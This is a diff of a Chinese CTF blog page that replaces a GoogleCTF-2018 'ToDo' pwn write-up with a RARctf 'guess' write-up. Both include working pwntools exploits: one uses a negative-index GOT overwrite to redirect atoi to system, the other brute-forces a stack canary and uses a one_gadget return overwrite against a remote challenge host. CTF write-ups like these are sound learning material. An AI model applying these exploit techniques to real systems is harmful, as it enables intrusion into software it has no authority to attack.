@@ -24,26 +24,23 @@
     var CONFIG = {"hostname":"mark0519.github.io","root":"/","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
-  <meta name="description" content="GoogleCTF-2018 Fridge ToDo List开启了PIE，无法在内存中确定具体的地址了。现在先看看程序有什么功能，1-6个选项。">
+  <meta name="description" content="RARctf guess0x00  分析一共可以爆破8个字节 前七次爆破canary（canary以00结尾） 第八次爆破ret 一次溢出 填充canary之后修改ret的最后3个字节位为one gadget 0x01 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn-GoogleCTF-2018-ToDo">
-<meta property="og:url" content="https://mark0519.github.io/2021/07/28/pwn-GoogleCTF-2018-ToDo/index.html">
+<meta property="og:title" content="pwn-RARctf-guess">
+<meta property="og:url" content="https://mark0519.github.io/2021/08/08/pwn-RARctf-guess/index.html">
 <meta property="og:site_name" content="Mark&#96;s blog">
-<meta property="og:description" content="GoogleCTF-2018 Fridge ToDo List开启了PIE，无法在内存中确定具体的地址了。现在先看看程序有什么功能，1-6个选项。">
+<meta property="og:description" content="RARctf guess0x00  分析一共可以爆破8个字节 前七次爆破canary（canary以00结尾） 第八次爆破ret 一次溢出 填充canary之后修改ret的最后3个字节位为one gadget 0x01 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/19.png">
-<meta property="og:image" content="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/20.png">
-<meta property="article:published_time" content="2021-07-28T11:08:56.000Z">
-<meta property="article:modified_time" content="2021-07-28T11:12:56.617Z">
+<meta property="article:published_time" content="2021-08-08T11:37:55.000Z">
+<meta property="article:modified_time" content="2021-08-08T11:40:59.396Z">
 <meta property="article:author" content="mark0519">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="python2">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/19.png">
 
 
-<link rel="canonical" href="https://mark0519.github.io/2021/07/28/pwn-GoogleCTF-2018-ToDo/">
+<link rel="canonical" href="https://mark0519.github.io/2021/08/08/pwn-RARctf-guess/">
 
 
 <script class="page-configurations">
@@ -56,7 +53,7 @@
   };
 </script>
 
-  <title>pwn-GoogleCTF-2018-ToDo | Mark`s blog</title>
+  <title>pwn-RARctf-guess | Mark`s blog</title>
   
 
 
@@ -184,7 +181,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <section class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#GoogleCTF-2018-Fridge-ToDo-List"><span class="nav-number">1.</span> <span class="nav-text">GoogleCTF-2018 Fridge ToDo List</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#RARctf-guess"><span class="nav-number">1.</span> <span class="nav-text">RARctf guess</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">0x00  分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-exp"><span class="nav-number">3.</span> <span class="nav-text">0x01 exp</span></a></li></ol></div>
         </section>
         <!--/noindex-->
 
@@ -253,7 +250,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://mark0519.github.io/2021/07/28/pwn-GoogleCTF-2018-ToDo/">
+    <link itemprop="mainEntityOfPage" href="https://mark0519.github.io/2021/08/08/pwn-RARctf-guess/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -266,7 +263,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          pwn-GoogleCTF-2018-ToDo
+          pwn-RARctf-guess
         </h1>
 
         <div class="post-meta-container">
@@ -278,7 +275,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2021-07-28 19:08:56 / 修改时间：19:12:56" itemprop="dateCreated datePublished" datetime="2021-07-28T19:08:56+08:00">2021-07-28</time>
+      <time title="创建时间：2021-08-08 19:37:55 / 修改时间：19:40:59" itemprop="dateCreated datePublished" datetime="2021-08-08T19:37:55+08:00">2021-08-08</time>
     </span>
 
   
@@ -298,29 +295,11 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="GoogleCTF-2018-Fridge-ToDo-List"><a href="#GoogleCTF-2018-Fridge-ToDo-List" class="headerlink" title="GoogleCTF-2018 Fridge ToDo List"></a>GoogleCTF-2018 Fridge ToDo List</h1><p>开启了PIE，无法在内存中确定具体的地址了。现在先看看程序有什么功能，1-6个选项。</p>
-<a id="more"></a>
-
-<ol>
-<li>打印列表</li>
-<li>打印ToDo的任务</li>
-<li>存储ToDo任务</li>
-<li>删除ToDo任务</li>
-<li>远程管理员</li>
-<li>退出</li>
-</ol>
-<p>首先第一个选项，就仅仅是打印，没什么输入，放弃。</p>
-<p>第二个第三个第四个会有编号输入，第二个有读操作，第三个有写操作，所以重点就是这两个。</p>
-<p>第五个查看源码就知道只是一个幌子。</p>
-<p>第六个没啥好说的，退出操作。</p>
-<p>看到第二个和第三个操作中都有同样的代码</p>
-<p><a target="_blank" rel="noopener" href="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/19.png"><img src="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/19.png" alt="img"></a></p>
-<p>这里只检查了是否大于最大数量，并没有限制是否小于0,。所以我们可以越界读和写。</p>
-<p>通过IDA我们分析看到 todo从0x203140开始，间隔为0x30，那么往上面看看有什么可以读写的。</p>
-<p><a target="_blank" rel="noopener" href="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/20.png"><img src="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/20.png" alt="img"></a></p>
-<p>不错，在.got.plt部分，我们可以读取到这三个函数的地址，泄露了函数地址，意味着我们可以得到libc的信息。</p>
-<p>这里我们看到atoi是每次我们输入编号都会调用的函数，atoi而且还在open的附近，那么我们可以把atoi覆盖成system执行我们的任意命令，造成命令执行。所以剩下的就简单了，执行写操作，通过之前泄露的libc得到system的地址，覆盖atoi的地址。代码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack,pack</span><br><span class="line"><span class="comment"># r = remote(&quot;fridge-todo-list.ctfcompetition.com&quot;,1337)</span></span><br><span class="line">r = process(<span class="string">&#x27;./todo&#x27;</span>)</span><br><span class="line">r.send(<span class="string">&quot;mark\n&quot;</span>)</span><br><span class="line">r.readuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;2\n&quot;</span>)</span><br><span class="line">r.readuntil(<span class="string">&quot;read?&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;-6\n&quot;</span>)</span><br><span class="line">res = r.readuntil(<span class="string">&quot;Hi mark,&quot;</span>).splitlines()[<span class="number">0</span>]</span><br><span class="line">write_addr = res.split(<span class="string">&#x27;:&#x27;</span>,<span class="number">1</span>)[<span class="number">1</span>][<span class="number">1</span>:].ljust(<span class="number">8</span>,<span class="built_in">chr</span>(<span class="number">0</span>))</span><br><span class="line">write_addr = unpack(<span class="string">&quot;&lt;Q&quot;</span>,write_addr)[<span class="number">0</span>]</span><br><span class="line">base_addr = write_addr<span class="number">-0x910</span></span><br><span class="line">system_addr = base_addr + <span class="number">0x940</span></span><br><span class="line">r.readuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;3\n&quot;</span>)</span><br><span class="line">r.readuntil(<span class="string">&quot;entry?&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;-4\n&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;A&quot;</span>*<span class="number">8</span>+pack(<span class="string">&quot;&lt;Q&quot;</span>,system_addr)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+        <h1 id="RARctf-guess"><a href="#RARctf-guess" class="headerlink" title="RARctf guess"></a>RARctf guess</h1><h1 id="0x00-分析"><a href="#0x00-分析" class="headerlink" title="0x00  分析"></a>0x00  分析</h1><p>一共可以爆破8个字节</p>
+<p>前七次爆破canary（canary以00结尾）</p>
+<p>第八次爆破ret</p>
+<p>一次溢出 填充canary之后修改ret的最后3个字节位为one gadget</p>
+<h1 id="0x01-exp"><a href="#0x01-exp" class="headerlink" title="0x01 exp"></a>0x01 exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> T</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">&#x27;./guess&#x27;</span>)</span><br><span class="line">	context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">&#x27;193.57.159.27&#x27;</span>, <span class="number">23476</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">canary = <span class="number">0</span></span><br><span class="line">idx = <span class="number">33</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">sum</span> &lt;= <span class="number">7</span>:</span><br><span class="line">	low = <span class="number">0</span></span><br><span class="line">	high = <span class="number">0xff</span></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">sum</span> != <span class="number">7</span>:</span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			p.sendlineafter(<span class="string">b&#x27;(0-7)? &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">			mid = <span class="built_in">int</span>((low+high)/<span class="number">2</span>)</span><br><span class="line">			p.sendlineafter(<span class="string">b&#x27;your guess: &#x27;</span>,<span class="built_in">str</span>(mid))</span><br><span class="line">			ret = p.recvline()</span><br><span class="line">			<span class="keyword">if</span> <span class="string">b&#x27;high&#x27;</span> <span class="keyword">in</span> ret:</span><br><span class="line">				high = mid</span><br><span class="line">			<span class="keyword">elif</span> <span class="string">b&#x27;low&#x27;</span> <span class="keyword">in</span> ret:</span><br><span class="line">				low = mid</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				print(<span class="string">&quot;[&quot;</span>, idx, <span class="string">&quot;] ==&gt; &quot;</span>, <span class="built_in">hex</span>(mid))</span><br><span class="line">				get = mid</span><br><span class="line">				time = idx - <span class="number">32</span></span><br><span class="line">				<span class="keyword">while</span> time:</span><br><span class="line">					mid = mid*<span class="number">0x100</span></span><br><span class="line">					time -= <span class="number">1</span></span><br><span class="line">				canary += mid</span><br><span class="line">				print(<span class="string">&quot;[cancary] ==&gt; &quot;</span>, <span class="built_in">hex</span>(canary))</span><br><span class="line">				idx += <span class="number">1</span></span><br><span class="line">				<span class="built_in">sum</span> += <span class="number">1</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			p.sendlineafter(<span class="string">b&#x27;(0-7)? &#x27;</span>,<span class="built_in">str</span>(<span class="number">50</span>))</span><br><span class="line">			mid = <span class="built_in">int</span>((low+high)/<span class="number">2</span>)</span><br><span class="line">			p.sendlineafter(<span class="string">b&#x27;your guess: &#x27;</span>,<span class="built_in">str</span>(mid))</span><br><span class="line">			ret = p.recvline()</span><br><span class="line">			<span class="keyword">if</span> <span class="string">b&#x27;high&#x27;</span> <span class="keyword">in</span> ret:</span><br><span class="line">				high = mid</span><br><span class="line">			<span class="keyword">elif</span> <span class="string">b&#x27;low&#x27;</span> <span class="keyword">in</span> ret:</span><br><span class="line">				low = mid</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="built_in">sum</span> += <span class="number">1</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ogg = [<span class="number">0xe6c7e</span>,<span class="number">0xe6c81</span>,<span class="number">0xe6c84</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span> + p64(canary) + <span class="string">b&#x27;bbbbbbbb&#x27;</span> + p8(<span class="number">0x7e</span>) + p8(<span class="number">0x6c</span>) + p8(mid<span class="number">-0x2</span>+<span class="number">0xe</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;my game? &quot;</span>, payload)</span><br><span class="line">p.sendline(<span class="string">&quot;cat flag.txt&quot;</span>)</span><br><span class="line">p.interactive()  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
     </div>
@@ -339,7 +318,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="https://mark0519.github.io/2021/07/28/pwn-GoogleCTF-2018-ToDo/" title="pwn-GoogleCTF-2018-ToDo">https://mark0519.github.io/2021/07/28/pwn-GoogleCTF-2018-ToDo/</a>
+      <a href="https://mark0519.github.io/2021/08/08/pwn-RARctf-guess/" title="pwn-RARctf-guess">https://mark0519.github.io/2021/08/08/pwn-RARctf-guess/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -357,14 +336,11 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2021/07/26/pwn-cybricCTF-GrOSs1%E5%A4%8D%E7%8E%B0/" rel="prev" title="pwn-cybricCTF-GrOSs1复现">
-                  <i class="fa fa-chevron-left"></i> pwn-cybricCTF-GrOSs1复现
+                <a href="/2021/08/07/pwn-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-GHOST/" rel="prev" title="pwn-巅峰极客-GHOST">
+                  <i class="fa fa-chevron-left"></i> pwn-巅峰极客-GHOST
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2021/07/30/pwn-%E9%A2%98%E7%9B%AEdocker%E6%90%AD%E5%BB%BA/" rel="next" title="pwn-题目docker搭建">
-                  pwn-题目docker搭建 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
